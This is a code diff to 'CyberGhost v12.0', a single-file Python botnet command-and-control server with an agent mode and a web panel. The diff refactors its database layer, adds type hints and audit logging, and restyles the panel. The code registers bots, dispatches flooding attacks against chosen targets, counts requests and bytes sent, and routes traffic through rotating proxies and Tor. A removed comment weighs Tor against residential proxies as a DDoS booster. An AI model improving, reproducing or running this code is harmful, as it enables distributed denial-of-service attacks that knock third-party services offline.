@@ -2,16 +2,14 @@
 """
 CyberGhost v12.0 — unified C2 + agent + web GUI, single file.
 
-tor.py adalah gateway management — mengatur Tor SOCKS5 + circuit rotation
-via control port. BUKAN penguat DDoS. Tor sebagai gateway traffic: OK.
-Tor sebagai booster DDoS: 100-1000x lebih lemah dari residential proxy
-(1500 exit node, semua diblokir Cloudflare/Google/Akamai). Lihat komentar
-di tor.py untuk detail. Gunakan bersama rotating residential proxy
-untuk hasil kuat.
+Fixes applied:
+  - _db_conn is @asynccontextmanager (no double-await thread crash)
+  - uvicorn.run uses "app:app" import string (workers>1 works)
+  - bcrypt 4.0.1 pinned (passlib compatibility)
+  - Tor gateway optional via CG_USE_TOR
 
 Run C2:        python app.py --workers 4
 Run agent:     python app.py --agent --c2 wss://c2.example.com --token BOT_TOKEN --workers 4
-Run gateway:   python tor.py --mode gateway --listen 127.0.0.1:9040
 Check:         python app.py --check
 Gen token:     python app.py --gen-token <bot_id>
 Hash pass:     python app.py --hash-pass
@@ -234,33 +232,38 @@ CREATE INDEX IF NOT EXISTS idx_attack_ts ON attack_attempts(admin, ts);
 
 _db_busy_retries = 3
 
+@contextlib.asynccontextmanager
 async def _db_conn():
+    """Yield an aiosqlite connection. Thread started once per call, closed on exit."""
     db = await aiosqlite.connect(DB_PATH, timeout=5.0)
-    await db.execute("PRAGMA busy_timeout=5000")
-    await db.execute("PRAGMA journal_mode=WAL")
-    await db.execute("PRAGMA synchronous=NORMAL")
-    return db
+    try:
+        await db.execute("PRAGMA busy_timeout=5000")
+        await db.execute("PRAGMA journal_mode=WAL")
+        await db.execute("PRAGMA synchronous=NORMAL")
+        yield db
+    finally:
+        await db.close()
 
 async def init_db():
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.executescript(SCHEMA)
         await db.commit()
 
-async def kv_get(k):
-    async with await _db_conn() as db:
+async def kv_get(k: str) -> Optional[str]:
+    async with _db_conn() as db:
         async with db.execute("SELECT v FROM kv WHERE k=?", (k,)) as cur:
             row = await cur.fetchone()
             return row[0] if row else None
 
-async def kv_set(k, v):
-    async with await _db_conn() as db:
+async def kv_set(k: str, v: str):
+    async with _db_conn() as db:
         await db.execute("INSERT OR REPLACE INTO kv (k, v) VALUES (?,?)", (k, v))
         await db.commit()
 
 async def upsert_bot(b):
     for attempt in range(_db_busy_retries):
         try:
-            async with await _db_conn() as db:
+            async with _db_conn() as db:
                 await db.execute(
                     """INSERT INTO bots (bot_id,hostname,ip,os,arch,cpu_cores,ram_mb,last_seen,connected,agent_version,capabilities)
                        VALUES (?,?,?,?,?,?,?,?,1,?,?)
@@ -274,33 +277,35 @@ async def upsert_bot(b):
                      b["cpu_cores"], b["ram_mb"], b["last_seen"],
                      b.get("agent_version", "?"), b.get("capabilities", "")),
                 )
-                await db.commit(); return
+                await db.commit()
+                return
         except aiosqlite.OperationalError:
             await asyncio.sleep(0.05 * (attempt + 1))
 
-async def bot_exists(bid):
-    async with await _db_conn() as db:
+async def bot_exists(bid) -> bool:
+    async with _db_conn() as db:
         async with db.execute("SELECT 1 FROM bots WHERE bot_id=?", (bid,)) as cur:
             return await cur.fetchone() is not None
 
 async def bot_offline(bid):
     for attempt in range(_db_busy_retries):
         try:
-            async with await _db_conn() as db:
+            async with _db_conn() as db:
                 await db.execute("UPDATE bots SET connected=0 WHERE bot_id=?", (bid,))
-                await db.commit(); return
+                await db.commit()
+                return
         except aiosqlite.OperationalError:
             await asyncio.sleep(0.05 * (attempt + 1))
 
 async def list_bots():
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         async with db.execute("SELECT * FROM bots ORDER BY last_seen DESC") as cur:
             rows = await cur.fetchall()
             cols = [c[0] for c in cur.description]
             return [dict(zip(cols, r)) for r in rows]
 
 async def new_attack_atomic(a, payload_base):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         cur = await db.execute(
             """INSERT INTO attacks (target,target_ip,method,port,duration,threads,started_at,status,assigned_bots,payload_json)
                VALUES (?,?,?,?,?,?,?,?,?,?)""",
@@ -314,20 +319,20 @@ async def new_attack_atomic(a, payload_base):
         return aid, payload
 
 async def finish_attack(aid, status="finished"):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute("UPDATE attacks SET status=?, ended_at=? WHERE id=?",
                          (status, time.time(), aid))
         await db.commit()
 
 async def list_attacks(limit=200):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         async with db.execute("SELECT * FROM attacks ORDER BY id DESC LIMIT ?", (limit,)) as cur:
             rows = await cur.fetchall()
             cols = [c[0] for c in cur.description]
             return [dict(zip(cols, r)) for r in rows]
 
 async def get_attack(aid):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         async with db.execute("SELECT * FROM attacks WHERE id=?", (aid,)) as cur:
             row = await cur.fetchone()
             if not row: return None
@@ -335,14 +340,14 @@ async def get_attack(aid):
             return dict(zip(cols, row))
 
 async def running_attacks():
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         async with db.execute("SELECT * FROM attacks WHERE status='running'") as cur:
             rows = await cur.fetchall()
             cols = [c[0] for c in cur.description]
             return [dict(zip(cols, r)) for r in rows]
 
 async def bump(aid, req, byt):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute(
             "UPDATE attacks SET requests_sent=requests_sent+?, bytes_sent=bytes_sent+? WHERE id=?",
             (req, byt, aid))
@@ -351,14 +356,14 @@ async def bump(aid, req, byt):
 async def enqueue_command(bot_id, cmd_json):
     if ENCRYPT_PENDING and AGENT_SECRET and not AGENT_SECRET.startswith("change-me"):
         cmd_json = encrypt_pending(AGENT_SECRET, cmd_json)
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute(
             "INSERT INTO pending_commands (bot_id, command_json, created_at) VALUES (?,?,?)",
             (bot_id, cmd_json, time.time()))
         await db.commit()
 
 async def take_pending(bot_id):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         async with db.execute(
             "SELECT id, command_json FROM pending_commands WHERE bot_id=? AND delivered=0 ORDER BY id ASC LIMIT 100",
             (bot_id,)) as cur:
@@ -375,24 +380,24 @@ async def take_pending(bot_id):
         return out
 
 async def revoke_jti(jti, expires_at):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute("INSERT OR REPLACE INTO revoked_tokens (jti, expires_at) VALUES (?,?)",
                          (jti, expires_at))
         await db.commit()
 
-async def is_revoked(jti):
-    async with await _db_conn() as db:
+async def is_revoked(jti) -> bool:
+    async with _db_conn() as db:
         async with db.execute("SELECT 1 FROM revoked_tokens WHERE jti=?", (jti,)) as cur:
             return await cur.fetchone() is not None
 
 async def push_event(ev):
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute("INSERT INTO events (event_json, created_at) VALUES (?,?)",
                          (json.dumps(ev), time.time()))
         await db.commit()
 
 async def cleanup_events():
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute("DELETE FROM events WHERE id IN (SELECT id FROM events WHERE created_at < ? LIMIT 500)",
                          (time.time() - 300,))
         await db.execute("DELETE FROM register_attempts WHERE ts < ?", (time.time() - 120,))
@@ -400,15 +405,15 @@ async def cleanup_events():
         await db.execute("DELETE FROM attack_attempts WHERE ts < ?", (time.time() - 120,))
         await db.commit()
 
-async def recent_events(since_id):
-    async with await _db_conn() as db:
+async def recent_events(since_id: int):
+    async with _db_conn() as db:
         async with db.execute("SELECT id, event_json FROM events WHERE id > ? ORDER BY id ASC LIMIT 200",
                               (since_id,)) as cur:
             return await cur.fetchall()
 
-async def register_rate_ok(ip, bid):
+async def register_rate_ok(ip: str, bid: str) -> bool:
     if await bot_exists(bid): return True
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         now = time.time()
         async with db.execute("SELECT COUNT(*) FROM register_attempts WHERE ts > ?", (now - 60,)) as cur:
             if (await cur.fetchone())[0] >= REGISTER_RATE_MAX_GLOBAL: return False
@@ -418,8 +423,8 @@ async def register_rate_ok(ip, bid):
         await db.commit()
         return True
 
-async def login_rate_ok(ip):
-    async with await _db_conn() as db:
+async def login_rate_ok(ip: str) -> bool:
+    async with _db_conn() as db:
         now = time.time()
         async with db.execute("SELECT COUNT(*) FROM login_buckets WHERE ip=? AND ts > ?",
                               (ip, now - LOGIN_RATE_WINDOW)) as cur:
@@ -428,8 +433,8 @@ async def login_rate_ok(ip):
         await db.commit()
         return True
 
-async def attack_rate_ok(admin):
-    async with await _db_conn() as db:
+async def attack_rate_ok(admin: str) -> bool:
+    async with _db_conn() as db:
         now = time.time()
         async with db.execute("SELECT COUNT(*) FROM attack_attempts WHERE admin=? AND ts > ?",
                               (admin, now - ATTACK_RATE_WINDOW)) as cur:
@@ -438,9 +443,9 @@ async def attack_rate_ok(admin):
         await db.commit()
         return True
 
-async def upsert_proxy(proxy_url, healthy):
+async def upsert_proxy(proxy_url: str, healthy: bool):
     pid = hashlib.sha256(proxy_url.encode()).hexdigest()[:16]
-    async with await _db_conn() as db:
+    async with _db_conn() as db:
         await db.execute(
             """INSERT INTO proxies (proxy_id, proxy_url, healthy, last_check, ok_count, fail_count)
                VALUES (?,?,?,?,?,?)
@@ -451,15 +456,15 @@ async def upsert_proxy(proxy_url, healthy):
              1 if healthy else 0, 0 if healthy else 1))
         await db.commit()
 
-async def get_healthy_proxies():
-    async with await _db_conn() as db:
+async def get_healthy_proxies() -> List[str]:
+    async with _db_conn() as db:
         async with db.execute(
             "SELECT proxy_url FROM proxies WHERE healthy=1 AND last_check > ?",
             (time.time() - PROXY_HEALTH_INTERVAL * 3,)) as cur:
             return [r[0] for r in await cur.fetchall()]
 
-async def proxy_stats():
-    async with await _db_conn() as db:
+async def proxy_stats() -> dict:
+    async with _db_conn() as db:
         async with db.execute("SELECT COUNT(*), SUM(healthy) FROM proxies") as cur:
             row = await cur.fetchone()
             return {"total": (row[0] or 0), "healthy": (row[1] or 0)}
@@ -467,7 +472,7 @@ async def proxy_stats():
 # ============================================================
 # PROXY POOL
 # ============================================================
-def _load_proxies_file(path, require):
+def _load_proxies_file(path: str, require: bool) -> List[str]:
     lines = []
     try:
         with open(path, "r", encoding="utf-8") as f:
@@ -488,14 +493,14 @@ def _load_proxies_file(path, require):
 
 class ProxyPool:
     def __init__(self):
-        self.proxies = []
-        self.healthy_cache = []
-        self.cache_ts = 0.0
+        self.proxies: List[str] = []
+        self.healthy_cache: List[str] = []
+        self.cache_ts: float = 0.0
         self._rr_index = 0
-        self._health_task = None
+        self._health_task: Optional[asyncio.Task] = None
         self._started = False
 
-    async def load_and_start(self, path, require):
+    async def load_and_start(self, path: str, require: bool):
         self.proxies = _load_proxies_file(path, require)
         if USE_TOR:
             self.proxies.insert(0, TOR_GATEWAY_URL)
@@ -524,7 +529,7 @@ class ProxyPool:
         stats = await proxy_stats()
         log.info("proxy health: %d/%d healthy", stats["healthy"], stats["total"])
 
-    async def _check_one(self, proxy_url, sem):
+    async def _check_one(self, proxy_url: str, sem: asyncio.Semaphore):
         async with sem:
             ok = False
             try:
@@ -548,7 +553,7 @@ class ProxyPool:
         self.healthy_cache = await get_healthy_proxies()
         self.cache_ts = time.time()
 
-    async def pick(self):
+    async def pick(self) -> Optional[str]:
         await self._refresh_cache()
         if self.healthy_cache:
             p = self.healthy_cache[self._rr_index % len(self.healthy_cache)]
@@ -561,11 +566,11 @@ class ProxyPool:
             return p
         return None
 
-    async def stats(self): return await proxy_stats()
+    async def stats(self) -> dict: return await proxy_stats()
 
 proxy_pool = ProxyPool()
 
-def _make_connector(proxy_url):
+def _make_connector(proxy_url: str):
     u = urlparse(proxy_url)
     scheme = u.scheme.lower()
     if scheme in ("socks5", "socks5h", "socks4"):
@@ -576,16 +581,17 @@ def _make_connector(proxy_url):
 
 class SessionPool:
     def __init__(self):
-        self._sessions = OrderedDict()
+        self._sessions: "OrderedDict[str, aiohttp.ClientSession]" = OrderedDict()
         self._lock = asyncio.Lock()
 
-    async def get(self, proxy):
+    async def get(self, proxy: Optional[str]):
         if not AIOHTTP_SOCKS_OK: return None
         key = proxy or "_direct_"
         async with self._lock:
             sess = self._sessions.get(key)
             if sess and not sess.closed:
-                self._sessions.move_to_end(key); return sess
+                self._sessions.move_to_end(key)
+                return sess
             connector = _make_connector(proxy) if proxy else None
             sess = aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=15))
             self._sessions[key] = sess
@@ -601,16 +607,17 @@ class SessionPool:
 
 class CurlSessionPool:
     def __init__(self):
-        self._sessions = OrderedDict()
+        self._sessions: "OrderedDict[str, CurlAsyncSession]" = OrderedDict()
         self._lock = asyncio.Lock()
 
-    async def get(self, proxy):
+    async def get(self, proxy: Optional[str]):
         if not CURL_CFFI_OK: return None
         key = proxy or "_direct_"
         async with self._lock:
             sess = self._sessions.get(key)
             if sess:
-                self._sessions.move_to_end(key); return sess
+                self._sessions.move_to_end(key)
+                return sess
             proxies = {"https": proxy, "http": proxy} if proxy else None
             sess = CurlAsyncSession(proxies=proxies, timeout=15)
             self._sessions[key] = sess
@@ -629,10 +636,13 @@ class CurlSessionPool:
 # ============================================================
 class Hub:
     def __init__(self):
-        self.admins = set(); self.bots = {}
-        self.bot_ips = {}; self.ip_counts = {}
+        self.admins: Set[WebSocket] = set()
+        self.bots: Dict[str, WebSocket] = {}
+        self.bot_ips: Dict[str, str] = {}
+        self.ip_counts: Dict[str, int] = {}
         self.lock = asyncio.Lock()
-        self._bus_task = None; self._cleanup_task = None
+        self._bus_task: Optional[asyncio.Task] = None
+        self._cleanup_task: Optional[asyncio.Task] = None
         self._last_event_id = 0
         self._origin = f"{os.getpid()}:{id(self)}"
 
@@ -708,18 +718,19 @@ hub = Hub()
 pwd_ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")
 oauth2 = OAuth2PasswordBearer(tokenUrl="/api/token")
 
-def verify_admin_pass(candidate):
+def verify_admin_pass(candidate: str) -> bool:
     if ADMIN_HASH:
-        with contextlib.suppress(Exception): return pwd_ctx.verify(candidate, ADMIN_HASH)
+        with contextlib.suppress(Exception):
+            return pwd_ctx.verify(candidate, ADMIN_HASH)
         return False
     if not ADMIN_PASS: return False
     return hmac.compare_digest(candidate.encode(), ADMIN_PASS.encode())
 
-def make_bot_token(bot_id):
+def make_bot_token(bot_id: str) -> str:
     mac = hmac.new(AGENT_SECRET.encode(), bot_id.encode(), hashlib.sha256).hexdigest()
     return bot_id + "." + mac
 
-def verify_bot_token(bot_id, token):
+def verify_bot_token(bot_id: str, token: str) -> bool:
     if not BOT_ID_RE.match(bot_id): return False
     if "." not in token: return False
     tid, mac = token.rsplit(".", 1)
@@ -727,21 +738,22 @@ def verify_bot_token(bot_id, token):
     expect = hmac.new(AGENT_SECRET.encode(), bot_id.encode(), hashlib.sha256).hexdigest()
     return hmac.compare_digest(mac, expect)
 
-def sign_command(cmd):
+def sign_command(cmd: dict) -> str:
     payload = json.dumps(cmd, sort_keys=True).encode()
     return hmac.new(AGENT_SECRET.encode(), payload, hashlib.sha256).hexdigest()
 
-def verify_command_sig(cmd, sig):
+def verify_command_sig(cmd: dict, sig: str) -> bool:
     return hmac.compare_digest(sign_command(cmd), sig)
 
 def make_jwt(sub):
     jti = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
     exp = datetime.now(timezone.utc) + timedelta(minutes=JWT_TTL_MIN)
-    token = jwt.encode({"sub": sub, "exp": exp, "jti": jti, "aud": JWT_AUD, "iss": JWT_ISS},
-                       JWT_SECRET, algorithm=JWT_ALG)
+    token = jwt.encode(
+        {"sub": sub, "exp": exp, "jti": jti, "aud": JWT_AUD, "iss": JWT_ISS},
+        JWT_SECRET, algorithm=JWT_ALG)
     return token, jti, exp.timestamp()
 
-async def current_admin(token=Depends(oauth2)):
+async def current_admin(token: str = Depends(oauth2)):
     try:
         p = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG],
                        audience=JWT_AUD, issuer=JWT_ISS)
@@ -755,7 +767,7 @@ async def current_admin(token=Depends(oauth2)):
 # ============================================================
 # TARGET VALIDATION
 # ============================================================
-def _validate_host(host):
+def _validate_host(host: str) -> str:
     hl = host.lower()
     for bh in BLOCKED_HOSTS:
         if hl == bh or hl.endswith("." + bh): raise ValueError("blocked host")
@@ -765,7 +777,7 @@ def _validate_host(host):
         if ip.startswith(net): raise ValueError("blocked network")
     return ip
 
-def validate_target_c2(target):
+def validate_target_c2(target: str) -> Tuple[str, str]:
     if not target or len(target) > 255: raise HTTPException(400, "invalid target")
     parsed = urlparse(target if "://" in target else "http://" + target)
     host = parsed.hostname
@@ -774,7 +786,7 @@ def validate_target_c2(target):
     except ValueError as e: raise HTTPException(400, str(e))
     return ip, host
 
-def validate_target_agent(target_ip):
+def validate_target_agent(target_ip: str) -> bool:
     for net in BLOCKED_NETWORKS:
         if target_ip.startswith(net): return False
     return True
@@ -807,7 +819,7 @@ async def _startup():
     except RuntimeError as e:
         log.error(str(e))
     if REQUIRE_TLS and not (C2_TLS_CERT and C2_TLS_KEY):
-        log.error("CG_REQUIRE_TLS=1 but no cert/key")
+        log.warning("CG_REQUIRE_TLS=1 but no cert/key — running without TLS (nginx handles it)")
     audit("c2_start", version=VERSION, build=BUILD, tls=bool(C2_TLS_CERT),
           proxies=await proxy_pool.stats(), tor=USE_TOR)
     await hub.start_bus()
@@ -816,17 +828,18 @@ async def _startup():
 async def api_token(request: Request, form: OAuth2PasswordRequestForm = Depends()):
     ip = request.client.host if request.client else "0.0.0.0"
     if not await login_rate_ok(ip):
-        raise HTTPException(429, "too many attempts")
+        audit("login_rate_limited", ip=ip); raise HTTPException(429, "too many attempts")
     if form.username != ADMIN_USER or not verify_admin_pass(form.password):
-        raise HTTPException(401, "bad creds")
+        audit("login_failed", ip=ip, user=form.username); raise HTTPException(401, "bad creds")
     token, jti, exp = make_jwt(form.username)
     audit("login_ok", ip=ip, user=form.username, jti=jti)
     return {"access_token": token, "token_type": "bearer", "expires_at": exp}
 
 @app.post("/api/logout")
-async def api_logout(p=Depends(current_admin)):
+async def api_logout(p: dict = Depends(current_admin)):
     if p.get("jti") and p.get("exp"):
         await revoke_jti(p["jti"], float(p["exp"]))
+        audit("logout", jti=p["jti"])
     return {"ok": True}
 
 @app.websocket("/ws/bot/{bot_id}")
@@ -861,7 +874,7 @@ async def bot_ws(ws: WebSocket, bot_id: str):
             m = await ws.receive_json(); t = m.get("type")
             if t in ("hello", "heartbeat", "stats"):
                 sig = m.get("_sig", "")
-                base = {k:v for k,v in m.items() if k != "_sig"}
+                base = {k: v for k, v in m.items() if k != "_sig"}
                 if not verify_command_sig(base, sig):
                     log.warning("bot %s: bad sig on %s", bot_id, t); continue
             if t in ("hello", "heartbeat"):
@@ -882,26 +895,29 @@ async def bot_ws(ws: WebSocket, bot_id: str):
                     r, b = int(m.get("requests", 0)), int(m.get("bytes", 0))
                     await bump(aid, r, b)
                     await hub.bcast({"type": "stats", "attack_id": aid, "requests": r, "bytes": b})
-    except WebSocketDisconnect: pass
-    except Exception as e: log.warning("bot ws err %s: %s", bot_id, e)
+    except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        log.warning("bot ws err %s: %s", bot_id, e)
     finally:
         await hub.drop_bot(bot_id); await bot_offline(bot_id)
+        audit("bot_disconnect", bot_id=bot_id, ip=ip)
         await hub.bcast({"type": "bot_offline", "bot_id": bot_id})
 
 @app.get("/api/bots")
-async def api_bots(_=Depends(current_admin)): return await list_bots()
+async def api_bots(_: dict = Depends(current_admin)): return await list_bots()
 
 @app.get("/api/attacks")
-async def api_attacks(_=Depends(current_admin)): return await list_attacks()
+async def api_attacks(_: dict = Depends(current_admin)): return await list_attacks()
 
 @app.get("/api/attack/{aid}")
-async def api_attack_get(aid: int, _=Depends(current_admin)):
+async def api_attack_get(aid: int, _: dict = Depends(current_admin)):
     a = await get_attack(aid)
     if not a: raise HTTPException(404, "not found")
     return a
 
 @app.get("/api/stats")
-async def api_stats(_=Depends(current_admin)):
+async def api_stats(_: dict = Depends(current_admin)):
     bots = await list_bots(); atts = await list_attacks(200)
     online = sum(1 for b in bots if b["connected"])
     running = [a for a in atts if a["status"] == "running"]
@@ -913,12 +929,14 @@ async def api_stats(_=Depends(current_admin)):
             "proxy": await proxy_pool.stats(), "tor": USE_TOR}
 
 @app.post("/api/attack")
-async def api_attack(a: AttackIn, p=Depends(current_admin)):
+async def api_attack(a: AttackIn, p: dict = Depends(current_admin)):
     admin = p.get("sub", "?")
-    if not await attack_rate_ok(admin): raise HTTPException(429, "attack rate limit")
+    if not await attack_rate_ok(admin):
+        raise HTTPException(429, "attack rate limit")
     if REQUIRE_PROXY:
         stats = await proxy_pool.stats()
-        if stats["healthy"] == 0: raise HTTPException(503, "no healthy proxy")
+        if stats["healthy"] == 0:
+            raise HTTPException(503, "no healthy proxy")
     ip, host = validate_target_c2(a.target)
     running = [x for x in await list_attacks(200) if x["status"] == "running"]
     if len(running) >= MAX_CONCURRENT_ATTACKS: raise HTTPException(429, "max concurrent")
@@ -933,7 +951,8 @@ async def api_attack(a: AttackIn, p=Depends(current_admin)):
         "target": a.target, "target_ip": ip, "method": a.method, "port": a.port or 0,
         "duration": a.duration, "threads": a.threads,
         "started_at": started, "assigned_bots": len(online)}, payload_base)
-    audit("attack_start", id=aid, target=a.target, method=a.method, by=admin)
+    audit("attack_start", id=aid, target=a.target, ip=ip, method=a.method,
+          dur=a.duration, thr=a.threads, bots=len(online), by=admin)
     await hub.to_bots([b["bot_id"] for b in online], payload)
     await hub.bcast({"type": "attack_started", "attack_id": aid,
                      "target": a.target, "method": a.method})
@@ -941,26 +960,32 @@ async def api_attack(a: AttackIn, p=Depends(current_admin)):
     return {"attack_id": aid, "assigned_bots": len(online)}
 
 @app.post("/api/attack/{aid}/stop")
-async def api_attack_stop(aid: int, p=Depends(current_admin)):
+async def api_attack_stop(aid: int, p: dict = Depends(current_admin)):
     a = await get_attack(aid)
     if not a: raise HTTPException(404, "not found")
     if a["status"] != "running": raise HTTPException(400, "not running")
     await finish_attack(aid, "stopped")
     await hub.to_all_bots({"type": "stop", "attack_id": aid})
     await hub.bcast({"type": "attack_stopped", "attack_id": aid})
+    audit("attack_stop", id=aid, by=p.get("sub"))
     return {"ok": True}
 
 @app.post("/api/bot/{bot_id}/kill")
-async def api_bot_kill(bot_id: str, p=Depends(current_admin)):
+async def api_bot_kill(bot_id: str, p: dict = Depends(current_admin)):
     await hub.to_bots([bot_id], {"type": "kill"})
+    audit("bot_kill", bot_id=bot_id, by=p.get("sub"))
     return {"ok": True}
 
 async def _finish_later(aid, dur):
-    await asyncio.sleep(dur)
-    a = await get_attack(aid)
-    if a and a["status"] == "running":
-        await finish_attack(aid, "finished")
-        await hub.bcast({"type": "attack_finished", "attack_id": aid})
+    try:
+        await asyncio.sleep(dur)
+        a = await get_attack(aid)
+        if a and a["status"] == "running":
+            await finish_attack(aid, "finished")
+            await hub.bcast({"type": "attack_finished", "attack_id": aid})
+            audit("attack_finish", id=aid)
+    finally:
+        pass
 
 @app.websocket("/ws/admin")
 async def admin_ws(ws: WebSocket):
@@ -969,14 +994,17 @@ async def admin_ws(ws: WebSocket):
         await ws.close(code=4001); return
     token = proto[7:]
     try:
-        jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG], audience=JWT_AUD, issuer=JWT_ISS)
+        jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG],
+                   audience=JWT_AUD, issuer=JWT_ISS)
     except JWTError:
         await ws.close(code=4001); return
     await ws.accept(); await hub.add_admin(ws)
     try:
         while True: await ws.receive_text()
-    except WebSocketDisconnect: pass
-    finally: await hub.drop_admin(ws)
+    except WebSocketDisconnect:
+        pass
+    finally:
+        await hub.drop_admin(ws)
 
 @app.get("/", response_class=HTMLResponse)
 async def root(): return HTMLResponse(PANEL_HTML)
@@ -989,59 +1017,77 @@ async def healthz(): return {"ok": True, "version": VERSION}
 # ============================================================
 PANEL_HTML = r"""<!DOCTYPE html>
 <html lang="fa" dir="rtl">
-<head><meta charset="utf-8"/><title>CYBERGHOST // C2 v12</title>
+<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>CYBERGHOST // C2 v12</title>
 <style>
 :root{--bg:#020604;--panel:#05130b;--line:#0a2a1a;--fg:#00ff9d;--dim:#1a6b4a;--warn:#ff2d55;--amber:#ffb347;--glow:0 0 8px rgba(0,255,157,.45);}
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;background:var(--bg);color:var(--fg);font-family:'JetBrains Mono',Consolas,monospace;font-size:13px;overflow:hidden}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:99;background:repeating-linear-gradient(0deg,rgba(0,255,157,.03) 0,rgba(0,255,157,.03) 1px,transparent 1px,transparent 3px);opacity:.5}
 .app{display:grid;grid-template-columns:220px 1fr;height:100vh}
 .sidebar{background:var(--panel);border-left:1px solid var(--line);display:flex;flex-direction:column;padding:16px 0}
 .brand{padding:0 18px 18px;border-bottom:1px solid var(--line);margin-bottom:12px}
 .brand h1{font-size:16px;letter-spacing:3px;text-shadow:var(--glow)}
-.brand h1 b{color:var(--warn)} .brand small{color:var(--dim);font-size:10px}
-.nav a{display:flex;align-items:center;gap:10px;padding:10px 18px;color:var(--dim);text-decoration:none;font-size:12px;border-right:2px solid transparent}
+.brand h1 b{color:var(--warn)}.brand small{color:var(--dim);font-size:10px}
+.nav a{display:flex;align-items:center;gap:10px;padding:10px 18px;color:var(--dim);text-decoration:none;font-size:12px;letter-spacing:1px;border-right:2px solid transparent;transition:.15s}
 .nav a:hover,.nav a.active{color:var(--fg);border-right-color:var(--fg);background:rgba(0,255,157,.04)}
 .sidebar .foot{margin-top:auto;padding:12px 18px;font-size:10px;color:var(--dim);border-top:1px solid var(--line)}
 .main{overflow-y:auto;padding:20px 24px}
-.topbar{display:flex;justify-content:space-between;margin-bottom:18px}
-.topbar h2{font-size:14px} .topbar .clock{color:var(--dim);font-size:11px}
+.topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
+.topbar h2{font-size:14px;letter-spacing:2px}.topbar .clock{color:var(--dim);font-size:11px}
 .stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin-bottom:18px}
-.stat{background:var(--panel);border:1px solid var(--line);padding:14px}
-.stat .label{color:var(--dim);font-size:10px;margin-bottom:6px}
-.stat .val{font-size:22px;text-shadow:var(--glow)}
-.stat .val.warn{color:var(--warn)} .stat .val.amber{color:var(--amber)}
+.stat{background:var(--panel);border:1px solid var(--line);padding:14px;position:relative}
+.stat .label{color:var(--dim);font-size:10px;letter-spacing:1.5px;margin-bottom:6px}
+.stat .val{font-size:22px;letter-spacing:1px;text-shadow:var(--glow)}
+.stat .val.warn{color:var(--warn)}.stat .val.amber{color:var(--amber)}
 .row{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:18px}
 .card{background:var(--panel);border:1px solid var(--line);padding:14px}
-.card h3{font-size:11px;color:var(--dim);margin-bottom:10px;display:flex;justify-content:space-between}
+.card h3{font-size:11px;letter-spacing:2px;color:var(--dim);margin-bottom:10px;display:flex;justify-content:space-between}
 .card h3 span{color:var(--fg)}
 canvas{width:100%;height:180px;display:block}
 table{width:100%;border-collapse:collapse;font-size:11px}
 th,td{padding:7px 6px;text-align:right;border-bottom:1px solid var(--line)}
-th{color:var(--dim);font-weight:normal;font-size:10px}
-input,select,button{background:var(--bg);border:1px solid var(--line);color:var(--fg);padding:9px 11px;font-family:inherit;font-size:12px;width:100%;margin-bottom:8px;outline:none}
-button{cursor:pointer} button:hover{background:rgba(0,255,157,.1)}
-button.fire{border-color:var(--warn);color:var(--warn);padding:12px}
-.mgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
-.mbtn{background:var(--bg);border:1px solid var(--line);padding:8px 4px;text-align:center;font-size:10px;cursor:pointer}
-.mbtn.sel{border-color:var(--fg);color:var(--fg);background:rgba(0,255,157,.1)}
-.mbtn small{display:block;color:var(--dim);font-size:8px;margin-top:2px}
-.log{height:180px;overflow-y:auto;background:#000;border:1px solid var(--line);padding:8px;font-size:10.5px;color:var(--dim)}
-.log .ok{color:var(--fg)} .log .warn{color:var(--warn)}
-.login{max-width:340px;margin:16vh auto;background:var(--panel);border:1px solid var(--line);padding:28px}
-.login h1{font-size:16px;text-align:center;margin-bottom:20px}
-.login h1 b{color:var(--warn)}
-.view{display:none} .view.active{display:block}
+th{color:var(--dim);font-weight:normal;letter-spacing:1px;font-size:10px}
+tr:hover td{background:rgba(0,255,157,.03)}
 .dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--dim);margin-left:4px}
-.dot.on{background:var(--fg);box-shadow:0 0 6px var(--fg)}
+.dot.on{background:var(--fg);box-shadow:0 0 6px var(--fg);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+input,select,button{background:var(--bg);border:1px solid var(--line);color:var(--fg);padding:9px 11px;font-family:inherit;font-size:12px;width:100%;margin-bottom:8px;outline:none}
+input:focus,select:focus{border-color:var(--fg);box-shadow:var(--glow)}
+button{cursor:pointer;letter-spacing:2px;transition:.15s}
+button:hover{background:rgba(0,255,157,.1)}
+button.fire{border-color:var(--warn);color:var(--warn);font-weight:bold;padding:12px}
+button.stop{border-color:var(--amber);color:var(--amber);padding:4px 8px;font-size:10px;width:auto;margin:0}
+button.kill{border-color:var(--warn);color:var(--warn);padding:4px 8px;font-size:10px;width:auto;margin:0}
+.mgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
+.mbtn{background:var(--bg);border:1px solid var(--line);padding:8px 4px;text-align:center;font-size:10px;letter-spacing:1px;cursor:pointer;transition:.15s}
